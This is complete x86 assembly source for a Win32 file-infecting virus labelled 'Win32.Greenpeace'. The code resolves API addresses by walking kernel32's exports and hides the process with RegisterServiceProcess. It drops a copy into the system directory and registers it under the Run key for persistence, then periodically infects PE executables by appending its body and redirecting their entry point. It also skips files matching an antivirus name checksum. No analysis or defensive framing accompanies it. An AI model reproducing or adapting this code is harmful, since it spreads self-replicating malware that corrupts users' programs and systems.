zcall macro name
      extrn &name&: proc
      call name
      endm

CRC32_init	equ 0EDB88320h
CRC32_num       equ 0FFFFFFFFh   

CRC32	macro	string
	    crcReg = CRC32_num
	    irpc    _x,<string>
		ctrlByte = '&_x&' xor (crcReg and 0FFh)
		crcReg = crcReg shr 8
		rept 8
		    ctrlByte = (ctrlByte shr 1) xor (CRC32_init * (ctrlByte and 1))
		endm
		crcReg = crcReg xor ctrlByte
	    endm
	    dd	crcReg
endm

MAX_PATH = 260

find_str struc
         dwFileAttributes  dd ?
         ftCreationTime    dq ?
         ftLastAccessTime  dq ?
         ftLastWriteTime   dq ? 
         nFileSizeHigh     dd ? 
         nFileSizeLow      dd ?
         dwReserved0       dd ?
         dwReserved1       dd ?   
         cFileName         db MAX_PATH dup (?)
         cAlternateFileName db 14 dup (?)
         ends

locals __
.386
.model flat
.data
db ?
.code
start:
    db 68h
start_ip dd offset host32
    pushad
    cld
    call get_delta 
    call check_base
    jc  __1
    cmp 1 ptr [ebp+is_dropper], 1
    jnz __2
    call [ebp+zGetCurrentProcessId]
    push 1
    push eax
    call [ebp+zRegisterServiceProcess]
    lea eax, [ebp+timer]
    push eax
    push 7000
    push 0 0 
    call [ebp+zSetTimer]
    mov 4 ptr [ebp+indf], eax 
    sub esp, 6*4 
    mov edi, esp
__4:
    push 0 0 0
    push edi
    call [ebp+zGetMessageA]
    test eax, eax
    jz  __3 ; true - 1
    push edi 
    call [ebp+zTranslateMessage]
    push edi
    call [ebp+zDispatchMessageA]
    jmp __4 
__3:
    db 68h
indf   dd 0
    push 0 
    call [ebp+zKillTimer]
    add esp, 6*4
    jmp __1
__2:
    lea eax, [ebp+name_atom]
    push eax 
    call [ebp+zGlobalFindAtomA]
    test eax, eax
    jnz  __1
    lea eax, [ebp+name_atom]
    push eax 
    call [ebp+zGlobalAddAtomA]
    test  eax, eax
    jz   __1
    call  residency
__1:
    popad
    pop eax
    jmp eax

is_dropper db 0

test_drive proc
    ; edx - name
    call __2
drive:
    db 'A:\',0
__2:
    mov edi, [esp]
    sub esp, 100h
    mov esi, esp
    push esi
    push 100h
    call [ebp+zGetCurrentDirectoryA]
    lodsb
    stosb
    add esp, 100h
__1:
    call [ebp+zGetDriveTypeA]
    cmp  eax, 3
    jnz  __3
    sub  esp, 4*4
    mov  esi, esp
    push esi
    lea  eax, [esi+4]
    push eax
    lea  eax, [esi+8]
    push eax
    lea  eax, [esi+12]
    push eax
    dec  edi
    push edi 
    call  [ebp+zGetDiskFreeSpaceA]
    mov  eax, [esi+4]
    sub  edx, edx
    mul  4 ptr [esi+8]
    mul  4 ptr [esi+12]
    add  esp, 4*4 
    cmp  eax, 100*1024*1024 ; must_free
__3:
    ret 
    endp

    name_atom db 'Greenpeace',0  
    name_exe  db '\Greenpeace.exe',0 

residency:
    sub esp, 100h
    mov esi, esp
    push 100h-14
    push esi
    call [ebp+zGetSystemDirectoryA]
    lea edi, [ebp+name_exe]
__1:
    mov dl, 1 ptr [edi]
    mov 1 ptr [esi+eax], dl
    inc eax
    inc edi
    cmp dl, 0
    jnz __1
    push vl+dropper_size+10000
    push 0
    call [ebp+zGlobalAlloc]
    xchg edi, eax
    push esi edi
    mov ecx, dropper_size
    lea esi, [ebp+dropper]
    call unpack
    pop edi 
    mov  eax, dropper_size+vl
    cdq
    push 200h
    pop  ecx
    div ecx
    inc eax
    mul ecx
    mov edx, [edi.3Ch]
    add edx, edi
    movzx ebx, 2 ptr [edx.14h]
    lea  ebx, [ebx+18h+edx+28h]
    mov esi, 4 ptr [edx.28h]
    add esi, 4 ptr [edx.34h]
    mov 4 ptr [ebp+start_ip], esi
    mov  4 ptr [edx.10h], 40D56780h
    push 4 ptr [ebx.10h]
    add  4 ptr [ebx.10h], eax
    mov  eax, 4 ptr [ebx.10h]
    add  eax, 2000h
    mov  4 ptr [ebx.08h], eax 
    pop eax
    add eax, 4 ptr [ebx.0Ch]
    mov 4 ptr [edx.28h], eax
    push edx
    mov  eax, dropper_size+vl
    cdq
    push 1000h
    pop  ecx
    div ecx
    inc eax
    mul ecx
    pop edx
    add 4 ptr [ebx.10h], eax
    add 4 ptr [edx.50h], eax
    add 4 ptr [edx.50h], 2000h
    push edi 
    mov 1 ptr [ebp+is_dropper], 1
    add edi, dropper_size
    lea esi, [ebp+start]
    mov ecx, vl
    cld
    rep movsb
    mov 1 ptr [ebp+is_dropper], 0
    pop edi

    pop esi
    push 0
    push 0
    push 2
    push 0
    push 0
    push 0C0000000h 
    push esi
    call [ebp+zCreateFileA]
    xchg eax, ebx  
    push eax    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    mov eax, esp                            ;;
    ;;;                                     ;;
    push 0                                  ;;
    push eax                                ;;
    mov  eax, dropper_size+vl               ;;
    cdq                                     ;;
    push 200h                               ;;
    pop  ecx                                ;;
    div ecx                                 ;;
    inc eax                                 ;;
    mul ecx                                 ;;
    push eax                                ;;
    push edi                                ;;
    push ebx                                ;;
    call [ebp+zWriteFile]                   ;;
    pop eax;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    push edi
    call [ebp+zGlobalFree]
    push ebx
    call [ebp+zCloseHandle]
    push 0
    push esi
    call [ebp+zWinExec]

    push eax eax ; sub esp, 8
    mov edi, esp
    lea edx, [edi.4]

    sub eax, eax
    push edx 
    push edi
    push eax
    push 0f003fh
    push eax
    push eax
    push eax
    lea eax, [ebp+key]
    push eax
    push 80000002h
    call [ebp+zRegCreateKeyExA]
    test eax, eax
    jnz @@x
    push 12
    push esi
    push 1
    push 0
    lea eax, [ebp+name_atom]
    push eax ;;; 
    push 4 ptr [edi]
    call [ebp+zRegSetValueExA]
    push 4 ptr [edi]
    call [ebp+zRegCloseKey]
@@x:
    add esp, 100h+4
    ret

; dropper
dropper_size = 1536
dropper:
     include drop.inc

unpack proc
      ; edi - buffer
      ; esi - source
      ; ecx - length
      sub ebx, ebx
__3:
      cmp ebx, ecx
      jb  __1
      ret
__1:  lodsb
      cmp al, 0AAh
      jz  __2
      stosb
      inc ebx
      jmp __3
__2:  lodsb
      cmp al, 0AAh
      jz  __1
      push ecx
      movzx ecx, al
      lodsb
      add  ebx, ecx
      rep  stosb
      pop  ecx
      jmp  __3
      endp


check_name proc
    ; esi - name
    push edx
    call test_drive
    pop esi
    jc  __1
    push 256
    pop ecx
__2:
    lodsb
    cmp al, 0
    jz __3 
    loop __2
    stc
    jmp __1
__3:
    sub ecx, 256
    neg ecx
__5:  
    cmp 1 ptr [esi], '/'
    jz __4
    cmp 1 ptr [esi], '\'
    jz __4
    cmp 1 ptr [esi], ':'
    jz __4
    dec esi
    loop __5
__4:
    inc esi
    ; get crc name
    sub edx, edx
    dec edx
__10:
    lodsb
    test al, al
    jz  __8
    cmp al, '.'
    jz  __8
    cmp al, 'a'
    jb __6
    cmp al, 'z'
    ja __6
    and al, not 20h
__6:
    xor dl, al
    push 8
    pop ecx
__9:
    shr edx, 1
    jnc __7
    xor edx, 0EDB88320h
__7:
    loop __9
    jmp __10
__8:
    ; edx - crc
    lea esi, [ebp+bad_namez]
__11:
    lodsd
    test eax, eax
    jz  __1 
    cmp eax, edx
    jnz __11
    stc 
__1:
    ret   
    endp

bad_namez:
    CRC32 AVPM
    dd 0

check_base proc
    call __1
    mov esp, [esp+8]
__3:
    stc
    jmp __2
__1:
    push 4 ptr fs:[0]
    mov  4 ptr fs:[0], esp    
    mov eax, [esp+12*4]
    sub ax, ax
__4:
    sub eax, 10000h 
    cmp 2 ptr [eax], 'ZM'
    jnz __4
    mov 4 ptr [ebp+image], eax 
    mov ebx, [eax+3Ch]
    mov ebx, [ebx+78h+eax]
    mov ecx, [ebx+18h+eax]
    mov esi, [ebx+20h+eax]
@@Loop_003:
    mov   edi, [esi+eax]
    add   edi, eax
    ; GetProcAddress
    cmp   dword ptr [edi], 'PteG'
    jnz   @@Next_001
    cmp   dword ptr [edi+4], 'Acor'
    jnz   @@Next_001
    cmp   dword ptr [edi+8], 'erdd'
    jnz   @@Next_001
    cmp   word ptr [edi+0Ch], 'ss'
    jnz   @@Next_001
    cmp   byte ptr [edi+0Eh], 0
    jz    @@GetProcAddressFound
@@Next_001:  add     esi, 4
    loop  @@Loop_003
@@GetProcAddressFound:
    sub   ecx, [ebx+18h+eax]
    neg   ecx
    shl   ecx, 1
    add   ecx, [ebx+24h+eax]
    add   ecx, eax
    movzx ecx, word ptr [ecx]
    shl   ecx, 2
    add   ecx, [ebx+1Ch+eax]
    mov   ecx, [ecx+eax]
    add   ecx, eax
    mov   4 ptr [ebp+zGetProcAddress], ecx
    lea eax, [ebp+sLoadLibraryA]
    push eax
    push 4 ptr [ebp+image]
    call ecx
    mov 4 ptr [ebp+zLoadLibraryA], eax
    call init
    clc
__2:
    pop 4 ptr fs:[0]
    pop eax
    ret
    endp

timer:
    pushad
    call get_delta 
    sub  esp, size find_str
    mov  esi, esp
    sub  edi, edi 
    push esi ;;; hehe 
    lea eax, [ebp+_mask]
    push eax
    call [ebp+zFindFirstFileA]
    cmp eax, -1
    jz  __1
__2:
    push eax
    push edi
    push esi
    lea  edx, [esi.cFileName]
    call infect
    pop  esi
    push esi
    push 4 ptr [esp.8]
    call [ebp+zFindNextFileA]
    pop  edi
    inc  edi
    cmp  edi, 50
    ja   __3
    test eax, eax
    pop  eax
    jnz __2
    push eax
__3:
    call [ebp+zFindClose] 
__1:
    add  esp, size find_str
    popad
    ret 4*4 

_mask db '*.exe',0

get_delta:
    call $+5
delta:
    pop ebp 
    sub ebp, offset delta
    ret 

    db '[V-4W Greenpeace]'  

image    dd 0BFF70000h

init proc
     lea esi, [ebp+import]
_init:
     lodsd
     add eax, ebp 
     push eax
     call [ebp+zLoadLibraryA]
     xchg eax, ebx
     lodsd
     add eax, ebp 
     xchg eax, edi
__2:
     lodsd
     test eax, eax
     jz  __1
     add eax, ebp 
     push eax
     push ebx
     call [ebp+zGetProcAddress]
     stosd
     jmp __2
__1: 
     cmp 4 ptr [esi], 0
     jnz _init
     ret
     endp

import:
     ; dll name
     dd offset @1
     dd offset zGetMessageA 
     dd offset @2
     dd offset @3
     dd offset @4
     dd offset @5
     dd offset @6
     dd offset @7    
     dd 0
     dd offset @@1
     dd offset zGlobalAddAtomA 
     dd offset @@2
     dd offset @@3
     dd offset @@4
     dd offset @@5
     dd offset @@6
     dd offset @@7
     dd offset @@8
     dd offset @@9
     dd offset @@10
     dd offset @@11
     dd offset @@12
     dd offset @@13
     dd offset @@14
     dd offset @@15
     dd offset @@16 
     dd offset @@17
     dd offset @@18
     dd offset @@19  
     dd offset @@20
     dd offset @@21 
     dd 0
     dd offset @@@1
     dd offset zRegSetValueExA  
     dd offset @@@2
     dd offset @@@3
     dd offset @@@4
     dd 0,0   

@1   db 'user32.dll',0
@2   db 'GetMessageA',0
@3   db 'TranslateMessage',0
@4   db 'MessageBoxA',0
@5   db 'DispatchMessageA',0
@6   db 'KillTimer',0
@7   db 'SetTimer',0

@@1  db 'kernel32.dll',0
@@2  db 'GlobalAddAtomA',0
@@3  db 'GetSystemDirectoryA',0
@@4  db 'GetCurrentDirectoryA',0
@@5  db 'WriteFile',0
@@6  db 'GlobalFindAtomA',0
@@7  db 'GetDriveTypeA',0
@@8  db 'GlobalDeleteAtom',0
@@9  db 'GlobalAlloc',0
@@10 db 'GetDiskFreeSpaceA',0
@@11 db 'CreateFileA',0
@@12 db 'CloseHandle',0
@@13 db 'GlobalFree',0
@@14 db 'WinExec',0
@@15 db 'GetCurrentProcessId',0
@@16 db 'RegisterServiceProcess',0
@@17 db 'FindFirstFileA',0
@@18 db 'FindNextFileA',0
@@19 db 'FindClose',0
@@20 db 'ReadFile',0
@@21 db 'SetFilePointer',0

@@@1 db 'advapi32.dll',0
@@@2 db 'RegSetValueExA',0
@@@3 db 'RegCreateKeyExA',0
@@@4 db 'RegCloseKey',0


sLoadLibraryA     db 'LoadLibraryA',0

zGetProcAddress   dd 0BFF76D5Ch
zLoadLibraryA     dd 0BFF77577h

zGetMessageA      dd 0BFF64CBDh ; user32
zTranslateMessage dd 0BFF64CE9h
zMessageBoxA      dd 0BFF638D9h
zDispatchMessageA dd 0BFF63E5Fh
zKillTimer        dd 0BFF61AC2h
zSetTimer         dd 0BFF62E82h

zGlobalAddAtomA       dd 0BFF773CCh ; kernel32
zGetSystemDirectoryA  dd 0BFF777EFh
zGetCurrentDirectoryA dd 0BFF77888h
zWriteFile            dd 0BFF75951h
zGlobalFindAtomA      dd 0BFF9DB9Eh
zGetDriveTypeA        dd 0BFF777C4h
zGlobalDeleteAtom     dd 0BFF9806Bh
zGlobalAlloc          dd 0BFF74904h
zGetDiskFreeSpaceA    dd 0BFF778C5h
zCreateFileA          dd 0BFF7799Ch
zCloseHandle          dd 0BFF7BC8Bh
zGlobalFree           dd 0BFF76DF1h
zWinExec              dd 0BFF9D330h
zGetCurrentProcessId    dd 0
zRegisterServiceProcess dd 0 
zFindFirstFileA         dd 0
zFindNextFileA          dd 0 
zFindClose              dd 0
zReadFile               dd 0
zSetFilePointer         dd 0

zRegSetValueExA  dd 0   ; advapi32
zRegCreateKeyExA dd 0
zRegCloseKey     dd 0 


key       db "Software\Microsoft\Windows\CurrentVersion\Run",0         

infect proc
    ; edx - name
    mov edi, 4 ptr [esi.nFileSizeLow]
    push edx edi
    call check_name
    pop edi edx  
    jc  __2
    mov ax, 3D42h 
    call dos
    jc  __2
    xchg eax, ebx
    mov ecx, 3Ch+4
    lea edx, [ebp+buffer]
    mov ah, 3Fh
    call dos
    cmp eax, ecx
    jnz close
    cmp 2 ptr [edx], 'ZM'
    jnz close
    mov eax, 4 ptr [edx.3Ch]
    cmp eax, 64000
    ja  close
    mov  4 ptr [ebp+heh], eax
    push eax
    pop  edx
    sub  ecx, ecx
    mov  ax, 4200h
    call dos
    mov ecx, 0F8h + (28h*8)   
    lea edx, [ebp+buffer]
    mov ah, 3Fh
    call dos
    cmp eax, ecx
    jnz close
    cmp 2 ptr [edx], 'EP'
    jnz close
    mov 4 ptr [edx.58h], 0
    test 2 ptr [edx.16h], 2000h
    jnz close
    test 2 ptr [edx.16h], 0002h
    jz  close
    cmp  2 ptr [edx.04h], 014Eh
    ja  close 
    cmp  2 ptr [edx.06h], 8
    ja  close

    movzx  esi, 2 ptr [edx.14h]
    lea  esi, [esi+18h+edx]
    movzx eax, 2 ptr [edx.06h]
    dec  eax
    imul eax, eax, 28h
    add  esi, eax
    mov  eax, 4 ptr [esi.14h]
    add  eax, 4 ptr [esi.10h]
    cmp  eax, edi
    jnz  close
    mov  eax, 4 ptr [edx.28h]
    add  eax, 4 ptr [edx.34h]
    mov  4 ptr [ebp+start_ip], eax   
    or   2 ptr [edx.16h], 0200h
    or   4 ptr [esi.24h], 0C0000000h
    mov  eax, 40D56780h
    cmp  4 ptr [edx.10h], eax
    jz   close
    mov  4 ptr [edx.10h], eax
    mov  eax, 4 ptr [esi.10h]
    mov  4 ptr [ebp+old_size], eax
    add  eax, 4 ptr [esi.0Ch]
    mov  4 ptr [edx.28h], eax
    mov  eax, 4 ptr [esi.10h]
    add  eax, vl
    call FileAlign
    mov  4 ptr [esi.10h], eax
    mov  eax, 4 ptr [esi.10h]
    add  eax, _vl
    call ObjAlign
    cmp  eax, 4 ptr [esi.08h]
    jb   __5
    mov  4 ptr [esi.08h], eax
__5:
    mov eax, 4 ptr [esi.0Ch]
    add eax, 4 ptr [esi.08h]
    call ObjAlign
    mov 4 ptr [edx.50h], eax

    mov ax, 4202h
    xor ecx, ecx
    cdq
    call dos

    mov ah, 40h
    lea edx, [ebp+start]
    mov ecx, 4 ptr [esi.10h] ; phys. size
    sub ecx, 4 ptr [ebp+old_size]
    call dos
    mov edx, 4 ptr [ebp+heh]
    sub ecx, ecx 
    mov ax, 4200h
    call dos
    lea edx, [ebp+buffer]
    mov ah, 40h
    mov ecx, 0F8h + (28h*8)   
    call dos
close:
    mov ah, 3Eh
    call dos
__2:
    ret
    endp

dos proc
    pushad
    cmp ah, 40h
    jnz __1
    push eax
    mov  eax, esp
    push 0
    push eax
    push ecx
    push edx
    push ebx
    call [ebp+zWriteFile]
    pop eax 
    jmp __2 
__1:
    cmp ah, 3Eh
    jnz __3
    push ebx
    call [ebp+zCloseHandle]
    jmp __2
__3:
    cmp ah, 3Fh
    jnz __4
    push eax
    mov  eax, esp
    push 0
    push eax
    push ecx
    push edx
    push ebx
    call [ebp+zReadFile]
    pop eax   
    jmp __2
__4:
    cmp ah, 42h
    jnz __5
    movzx eax, al
    push eax
    push ecx
    push edx
    push ebx
    call [ebp+zSetFilePointer]
    jmp __2 
__5:
    ; open
    push 0 0
    push 3
    push 0
    push 1
    push 0C0000000h 
    push edx
    call [ebp+zCreateFileA]

    cmp eax, -1
    jz  __x
    clc
    db 0B1h
__x:
    stc
__2:
    mov 4 ptr [esp.1Ch], eax
    popad
    ret 
    endp 

FileAlign:
     push edx
     mov ecx, [edx.3Ch]
     sub edx, edx
     div ecx
     test edx, edx
     jz  __3
     inc eax
     sub edx, edx
__3:  
     mul ecx
     pop edx
     ret

ObjAlign:
     push edx
     mov ecx, [edx.38h]
     sub edx, edx
     div ecx
     test edx, edx
     jz  __4
     inc eax
     sub edx, edx
__4:  
     mul ecx
     pop edx
     ret




vl = ($-start)

         db 4096 dup (?) 

buffer   db 0F8h + (28h*8) dup (?)
heh      dd 0
old_size dd 0

_vl = ($-start)


.data
msg1 db 'Win32.Greenpeace.'
     db vl / 1000 mod 10 + '0'
     db vl / 100  mod 10 + '0'
     db vl / 10   mod 10 + '0'
     db vl / 1    mod 10 + '0'
     db 0 
msg2 db 'First generation!',0

.code

extrn MessageBoxA: proc
extrn ExitProcess: proc

host32:
     push 0
     push offset msg1
     push offset msg2
     push 0
     call MessageBoxA
     push 0
     call ExitProcess

end start